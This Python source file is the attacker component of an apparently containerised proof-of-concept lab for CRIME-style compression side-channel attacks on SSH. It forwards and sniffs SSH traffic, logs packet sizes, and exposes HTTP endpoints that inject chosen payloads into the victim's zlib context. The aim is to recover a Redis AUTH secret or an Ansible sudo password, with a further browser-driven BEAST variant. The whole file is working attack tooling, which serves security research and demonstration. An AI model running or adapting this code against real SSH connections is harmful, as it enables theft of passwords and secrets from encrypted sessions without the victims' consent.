"""Attacker container.

Three things happen here:

  1. A passive TCP forwarder relays bytes between the SSH client (which
     dialled us on :2222) and the real SSH server on :22.  We do **not**
     terminate, decrypt, or alter SSH; the client pins the real server's
     host key so any attempt at active in-the-middle would be rejected.

  2. A scapy AsyncSniffer captures every TCP segment on ports 22 / 2222
     and records (timestamp, direction, payload size, flags).  This is
     the side-channel signal we need: even though the bytes are
     encrypted, the SSH binary packet protocol's per-packet length is
     directly observable in the TCP segment that carries it.

  3. An aiohttp HTTP control API on :9000 lets the verification driver
     query / clear the recorded packet log, trigger the client to send
     a Redis AUTH, and run the full attack.

The attack injects payloads by opening TCP connections to the client's
exposed Redis tunnel port.  Each connection creates a ``direct-tcpip``
SSH channel that shares the c->s zlib compression context with the
victim's Redis AUTH traffic.
"""

import asyncio
import logging
import os
import threading
import time
from typing import Any

import aiohttp
from aiohttp import web
from scapy.all import AsyncSniffer  # type: ignore
from scapy.layers.inet import IP, TCP  # type: ignore

from attack import run_attack as run_crime_attack
from attack_ansible import run_attack as run_ansible_attack
from attack_beast import BrowserBridge, run_attack as run_beast_attack

# New unified engine.
from attacker.attack.engine import run_attack as run_unified_attack
from attacker.attack.adapters.direct import DirectAdapter
from attacker.attack.adapters.beast import BeastAdapter
from attacker.attack.adapters.ansible import AnsibleAdapter

LOG = logging.getLogger("attacker")

SERVER_HOST = os.environ.get("SERVER_HOST", "server")
SERVER_PORT = int(os.environ.get("SERVER_PORT", "22"))
LISTEN_PORT = int(os.environ.get("LISTEN_PORT", "2222"))
HTTP_PORT = int(os.environ.get("HTTP_PORT", "9000"))
CLIENT_CONTROL_URL = os.environ.get("CLIENT_CONTROL_URL", "http://client:8000")
CLIENT_HOST = os.environ.get("CLIENT_HOST", "client")
TUNNEL_PORT = int(os.environ.get("TUNNEL_PORT", "6379"))
ANSIBLE_TUNNEL_PORT = int(os.environ.get("ANSIBLE_TUNNEL_PORT", "15432"))

SNIFF_FILTER = f"tcp and (port {SERVER_PORT} or port {LISTEN_PORT})"
SNIFF_IFACE = os.environ.get("SNIFF_IFACE", "eth0")


# --------------------------------------------------------------------------
# Packet log (shared between sniffer thread and asyncio handlers)
# --------------------------------------------------------------------------

class PacketLog:
    def __init__(self) -> None:
        self._records: list[dict[str, Any]] = []
        self._lock = threading.Lock()

    def add(self, record: dict[str, Any]) -> None:
        with self._lock:
            self._records.append(record)

    def snapshot(self, include_acks: bool = False) -> list[dict[str, Any]]:
        with self._lock:
            if include_acks:
                return list(self._records)
            return [r for r in self._records if r["tcp_payload_len"] > 0]

    def clear(self) -> None:
        with self._lock:
            self._records.clear()

    def __len__(self) -> int:
        with self._lock:
            return len(self._records)


PACKET_LOG = PacketLog()
BROWSER_BRIDGE = BrowserBridge()


def _on_packet(pkt) -> None:
    if not pkt.haslayer(TCP) or not pkt.haslayer(IP):
        return
    ip = pkt[IP]
    tcp = pkt[TCP]
    # TCP payload length = total IP length - IP header - TCP header
    tcp_payload_len = ip.len - (ip.ihl * 4) - (tcp.dataofs * 4)
    record = {
        "ts": time.time(),
        "src": ip.src,
        "dst": ip.dst,
        "sport": int(tcp.sport),
        "dport": int(tcp.dport),
        "flags": str(tcp.flags),
        "seq": int(tcp.seq),
        "ack": int(tcp.ack),
        "tcp_payload_len": int(tcp_payload_len),
    }
    PACKET_LOG.add(record)


def start_sniffer() -> AsyncSniffer:
    LOG.info(
        "starting AsyncSniffer iface=%s filter=%r",
        SNIFF_IFACE, SNIFF_FILTER,
    )
    sniffer = AsyncSniffer(
        iface=SNIFF_IFACE,
        filter=SNIFF_FILTER,
        prn=_on_packet,
        store=False,
    )
    sniffer.start()
    return sniffer


# --------------------------------------------------------------------------
# Passive TCP forwarder
# --------------------------------------------------------------------------

async def _pipe(src: asyncio.StreamReader, dst: asyncio.StreamWriter, label: str) -> None:
    total = 0
    try:
        while True:
            data = await src.read(65536)
            if not data:
                break
            total += len(data)
            dst.write(data)
            await dst.drain()
    except (ConnectionResetError, BrokenPipeError, asyncio.IncompleteReadError):
        pass
    except Exception:  # noqa: BLE001
        LOG.exception("[%s] pipe error", label)
    finally:
        try:
            dst.close()
        except Exception:  # noqa: BLE001
            pass
        # Debug-level: the Ansible variant opens thousands of short-lived
        # SSH connections and we don't want to log each one.
        LOG.debug("[%s] pipe closed (forwarded %d bytes)", label, total)


async def handle_inbound(
    reader: asyncio.StreamReader,
    writer: asyncio.StreamWriter,
) -> None:
    peer = writer.get_extra_info("peername")
    LOG.debug("client connected from %s", peer)
    try:
        upstream_reader, upstream_writer = await asyncio.open_connection(
            SERVER_HOST, SERVER_PORT,
        )
    except OSError as exc:
        LOG.error("cannot connect to upstream %s:%d: %s", SERVER_HOST, SERVER_PORT, exc)
        writer.close()
        return
    LOG.debug("upstream connected to %s:%d", SERVER_HOST, SERVER_PORT)

    await asyncio.gather(
        _pipe(reader, upstream_writer, "c->s"),
        _pipe(upstream_reader, writer, "s->c"),
    )
    LOG.debug("forwarder session done for %s", peer)


# --------------------------------------------------------------------------
# HTTP control API
# --------------------------------------------------------------------------

async def handle_status(request: web.Request) -> web.Response:
    return web.json_response({
        "ok": True,
        "server_target": f"{SERVER_HOST}:{SERVER_PORT}",
        "listen_port": LISTEN_PORT,
        "client_control_url": CLIENT_CONTROL_URL,
        "sniff_iface": SNIFF_IFACE,
        "sniff_filter": SNIFF_FILTER,
        "packet_log_len": len(PACKET_LOG),
        "browser_connected": BROWSER_BRIDGE.connected,
    })


async def handle_packet_log(request: web.Request) -> web.Response:
    include_acks = request.query.get("include_acks", "0") == "1"
    return web.json_response({
        "count": len(PACKET_LOG),
        "records": PACKET_LOG.snapshot(include_acks=include_acks),
    })


async def handle_clear_log(request: web.Request) -> web.Response:
    PACKET_LOG.clear()
    return web.json_response({"ok": True})


async def handle_trigger_secret(request: web.Request) -> web.Response:
    session: aiohttp.ClientSession = request.app["http"]
    async with session.post(f"{CLIENT_CONTROL_URL}/send_secret") as resp:
        body = await resp.json()
        return web.json_response({"ok": True, "client_response": body})


async def handle_trigger_payload(request: web.Request) -> web.Response:
    """Send a payload through the client's exposed tunnel port forward.

    The attacker opens a TCP connection to the client's Redis tunnel
    and writes the payload.  This data enters the SSH tunnel as
    direct-tcpip channel data in the c->s direction.
    """
    payload = await request.read()
    try:
        reader, writer = await asyncio.open_connection(
            CLIENT_HOST, TUNNEL_PORT,
        )
        writer.write(payload)
        await writer.drain()
        await asyncio.sleep(0.05)
        writer.close()
        await writer.wait_closed()
    except Exception as exc:  # noqa: BLE001
        LOG.exception("trigger_payload (tunnel) failed")
        return web.json_response(
            {"ok": False, "error": str(exc)}, status=500,
        )
    return web.json_response({"ok": True, "bytes_sent": len(payload)})


async def handle_run_attack(request: web.Request) -> web.Response:
    """Run the CRIME-style chosen-payload attack and return the recovered secret."""
    body: dict[str, Any] = {}
    if request.body_exists:
        try:
            body = await request.json()
        except Exception:  # noqa: BLE001
            body = {}
    known_prefix = body.get("known_prefix", "*3\r\n$4\r\nAUTH\r\n$7\r\ndefault\r\n$").encode("utf-8")
    alphabet = body.get("alphabet", "abcdefghijklmnopqrstuvwxyz0123456789")
    max_length = int(body.get("max_length", 32))
    noise_lengths = body.get("noise_lengths") or list(range(8))
    settle = float(body.get("settle", 0.003))
    flush_bytes = int(body.get("flush_bytes", 33000))
    min_margin = int(body.get("min_margin", 16))
    max_rounds = int(body.get("max_rounds", 64))

    LOG.info("HTTP /run_attack: prefix=%r alphabet_size=%d max=%d "
             "min_margin=%d max_rounds=%d",
             known_prefix, len(alphabet), max_length, min_margin, max_rounds)
    try:
        result = await run_crime_attack(
            packet_log=PACKET_LOG,
            known_prefix=known_prefix,
            alphabet_str=alphabet,
            max_length=max_length,
            noise_lengths=noise_lengths,
            settle=settle,
            flush_bytes=flush_bytes,
            min_margin=min_margin,
            max_rounds=max_rounds,
        )
    except Exception as exc:  # noqa: BLE001
        LOG.exception("attack failed")
        return web.json_response(
            {"ok": False, "error": str(exc)}, status=500,
        )
    LOG.info("attack done: recovered=%r", result["recovered"])
    return web.json_response({"ok": True, **result})


# --------------------------------------------------------------------------
# BEAST variant: exploit page + WebSocket + attack endpoint
# --------------------------------------------------------------------------

async def handle_exploit(request: web.Request) -> web.Response:
    with open("/app/exploit.html") as f:
        return web.Response(text=f.read(), content_type="text/html")


async def handle_ws(request: web.Request) -> web.WebSocketResponse:
    ws = web.WebSocketResponse()
    await ws.prepare(request)

    BROWSER_BRIDGE.set_ws(ws)
    LOG.info("browser connected via WebSocket")

    try:
        async for msg in ws:
            if msg.type == aiohttp.WSMsgType.TEXT:
                BROWSER_BRIDGE.on_message(msg.json())
            elif msg.type in (aiohttp.WSMsgType.ERROR, aiohttp.WSMsgType.CLOSE):
                break
    finally:
        BROWSER_BRIDGE.clear_ws()
        LOG.info("browser disconnected")

    return ws


async def handle_run_attack_ansible(request: web.Request) -> web.Response:
    """Run the Ansible-model attack (fresh SSH connection per guess).

    Each guess spawns an ``ansible-playbook`` run on the client via
    ``/send_secret_ansible``, which opens a fresh SSH connection, uses
    ``become: yes`` with sudo, and writes the sudo password to ssh's
    stdin.  The attacker then opens a ``direct-tcpip`` channel through
    the live SSH via the client's pre-existing LocalForward and
    injects one CRIME guess into the same zlib context.
    """
    body: dict[str, Any] = {}
    if request.body_exists:
        try:
            body = await request.json()
        except Exception:  # noqa: BLE001
            body = {}
    # Default prefix: the 8 fully-predictable bytes of the CHANNEL_DATA
    # header for the sudo-password packet (type + recipient-0 + 3 zero
    # bytes of the length field).  JSON strings carry raw bytes <0x80
    # verbatim through UTF-8, which is enough for both phases since
    # plausible password lengths and ASCII password characters all
    # live in that range.
    known_prefix = body.get(
        "known_prefix", "\x5e\x00\x00\x00\x00\x00\x00\x00",
    ).encode("utf-8")
    # Alphabet defaults to the password character set.  Phase 1
    # (length-byte recovery) overrides this with plausible length
    # bytes, e.g. "".join(chr(i) for i in range(1, 33)).
    alphabet = body.get("alphabet", "abcdefghijklmnopqrstuvwxyz0123456789")
    max_length = int(body.get("max_length", 32))
    noise_lengths = body.get("noise_lengths") or list(range(8))
    settle = float(body.get("settle", 0.1))
    min_margin = int(body.get("min_margin", 8))
    max_rounds = int(body.get("max_rounds", 96))
    # Optional: a per-position list of noise-length hints.  For byte
    # position `i < len(noise_hints)` the attack probes only the
    # single noise length `noise_hints[i]` instead of running the
    # full 8-noise sweep -- an ~8x speedup per hinted position.
    # Positions at or beyond `len(noise_hints)` fall back to the
    # full 8-noise sweep automatically.  Callers normally harvest
    # a prior run's `significant_noises` response field and feed it
    # back in here.  Leave unset (None) for the default "probe all
    # 8 noise lengths at every position" mode.
    noise_hints = body.get("noise_hints")
    if noise_hints is not None:
        noise_hints = [int(nl) for nl in noise_hints]
    # Default terminator: '\n' (byte 0x0a).  Ansible appends a newline
    # to the sudo password when writing it to ssh's stdin, so the
    # password on the wire is "<password>\n" and '\n' is the natural
    # stop signal for Phase 2.  Phase 1 overrides with '\x00' (not in
    # the plausible length alphabet).
    terminator_str = body.get("terminator", "\n")
    terminator = terminator_str.encode("utf-8")

    LOG.info(
        "HTTP /run_attack_ansible: prefix=%r alphabet_size=%d max=%d "
        "min_margin=%d max_rounds=%d terminator=%r noise_hints=%s",
        known_prefix, len(alphabet), max_length, min_margin, max_rounds,
        terminator, noise_hints,
    )
    try:
        result = await run_ansible_attack(
            packet_log=PACKET_LOG,
            known_prefix=known_prefix,
            alphabet_str=alphabet,
            max_length=max_length,
            noise_lengths=noise_lengths,
            terminator=terminator,
            settle=settle,
            min_margin=min_margin,
            max_rounds=max_rounds,
            noise_hints=noise_hints,
        )
    except Exception as exc:  # noqa: BLE001
        LOG.exception("ansible attack failed")
        return web.json_response(
            {"ok": False, "error": str(exc)}, status=500,
        )
    LOG.info("ansible attack done: recovered=%r", result["recovered"])
    return web.json_response({"ok": True, **result})


async def handle_run_attack_beast(request: web.Request) -> web.Response:
    """Run the BEAST-model attack (browser-based injection)."""
    if not BROWSER_BRIDGE.connected:
        return web.json_response(
            {"ok": False, "error": "browser not connected"}, status=503,
        )

    body: dict[str, Any] = {}
    if request.body_exists:
        try:
            body = await request.json()
        except Exception:  # noqa: BLE001
            body = {}
    known_prefix = body.get(
        "known_prefix", "*3\r\n$4\r\nAUTH\r\n$7\r\ndefault\r\n$",
    ).encode("utf-8")
    alphabet = body.get("alphabet", "abcdefghijklmnopqrstuvwxyz0123456789")
    max_length = int(body.get("max_length", 32))
    noise_lengths = body.get("noise_lengths") or list(range(8))
    settle = float(body.get("settle", 0.01))
    flush_bytes = int(body.get("flush_bytes", 33000))
    min_margin = int(body.get("min_margin", 64))
    max_rounds = int(body.get("max_rounds", 64))

    LOG.info(
        "HTTP /run_attack_beast: prefix=%r alphabet_size=%d max=%d "
        "min_margin=%d max_rounds=%d",
        known_prefix, len(alphabet), max_length, min_margin, max_rounds,
    )
    try:
        result = await run_beast_attack(
            packet_log=PACKET_LOG,
            bridge=BROWSER_BRIDGE,
            known_prefix=known_prefix,
            alphabet_str=alphabet,
            max_length=max_length,
            noise_lengths=noise_lengths,
            settle=settle,
            flush_bytes=flush_bytes,
            min_margin=min_margin,
            max_rounds=max_rounds,
        )
    except Exception as exc:  # noqa: BLE001
        LOG.exception("BEAST attack failed")
        return web.json_response(
            {"ok": False, "error": str(exc)}, status=500,
        )
    LOG.info("BEAST attack done: recovered=%r", result["recovered"])
    return web.json_response({"ok": True, **result})


# --------------------------------------------------------------------------
# Unified /run_attack_v2 endpoint — dispatches to the new engine via
# per-variant adapters. Coexists with the three legacy shim endpoints
# above until all variants are verified; they're removed in Task 16.
# --------------------------------------------------------------------------

_ADAPTER_BY_VARIANT: dict[str, Any] = {
    "direct": DirectAdapter,
    "beast": BeastAdapter,
    "ansible": AnsibleAdapter,
}


def _build_adapter(adapter_cls: Any, variant: str) -> Any:
    if variant == "direct":
        return adapter_cls(packet_log=PACKET_LOG)
    if variant == "beast":
        return adapter_cls(packet_log=PACKET_LOG, bridge=BROWSER_BRIDGE)
    if variant == "ansible":
        return adapter_cls(packet_log=PACKET_LOG)
    raise NotImplementedError(f"adapter construction not wired for variant {variant!r}")


async def handle_run_attack_v2(request: web.Request) -> web.Response:
    """Unified attack endpoint: /run_attack_v2 with {"variant": ..., "config": {...}}."""
    body: dict[str, Any] = {}
    if request.body_exists:
        try:
            body = await request.json()
        except Exception:  # noqa: BLE001
            body = {}
    variant = body.get("variant", "direct")
    overrides = body.get("config", {}) or {}

    adapter_cls = _ADAPTER_BY_VARIANT.get(variant)
    if adapter_cls is None:
        return web.json_response(
            {"ok": False, "error": f"unknown variant {variant!r}"}, status=400,
        )
    if variant == "beast" and not BROWSER_BRIDGE.connected:
        return web.json_response(
            {"ok": False, "error": "browser not connected"}, status=503,
        )

    config = adapter_cls.default_config().overlay(overrides)
    adapter = _build_adapter(adapter_cls, variant)

    LOG.info("HTTP /run_attack_v2: variant=%s label=%r", variant, config.label)
    try:
        result = await run_unified_attack(adapter=adapter, config=config)
    except Exception as exc:  # noqa: BLE001
        LOG.exception("unified attack failed")
        return web.json_response(
            {"ok": False, "error": str(exc), "variant": variant}, status=500,
        )
    LOG.info("unified attack done: recovered=%r", result["recovered"])
    return web.json_response({"ok": True, "variant": variant, **result})


# --------------------------------------------------------------------------
# main
# --------------------------------------------------------------------------

async def main() -> int:
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s %(name)s %(levelname)s %(message)s",
    )
    # Silence the per-request aiohttp access log -- the Ansible variant
    # fires thousands of /send_secret_ansible calls and each one would
    # otherwise add noise to the attack progress log.
    logging.getLogger("aiohttp.access").setLevel(logging.WARNING)

    sniffer = start_sniffer()

    # Start the TCP forwarder.
    forwarder = await asyncio.start_server(
        handle_inbound, host="0.0.0.0", port=LISTEN_PORT,
    )
    sockets = ", ".join(str(s.getsockname()) for s in forwarder.sockets)
    LOG.info("TCP forwarder listening on %s -> %s:%d", sockets, SERVER_HOST, SERVER_PORT)

    # Start the HTTP control API.
    http_session = aiohttp.ClientSession()
    app = web.Application()
    app["http"] = http_session
    app.router.add_get("/status", handle_status)
    app.router.add_get("/packet_log", handle_packet_log)
    app.router.add_post("/clear_log", handle_clear_log)
    app.router.add_post("/trigger_secret", handle_trigger_secret)
    app.router.add_post("/trigger_payload", handle_trigger_payload)
    app.router.add_post("/run_attack", handle_run_attack)
    app.router.add_post("/run_attack_ansible", handle_run_attack_ansible)
    app.router.add_get("/exploit", handle_exploit)
    app.router.add_get("/ws", handle_ws)
    app.router.add_post("/run_attack_beast", handle_run_attack_beast)
    app.router.add_post("/run_attack_v2", handle_run_attack_v2)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", HTTP_PORT)
    await site.start()
    LOG.info("HTTP control API listening on 0.0.0.0:%d", HTTP_PORT)

    try:
        async with forwarder:
            await forwarder.serve_forever()
    finally:
        sniffer.stop()
        await http_session.close()
    return 0


if __name__ == "__main__":
    import sys
    try:
        sys.exit(asyncio.run(main()))
    except (KeyboardInterrupt, SystemExit):
        pass
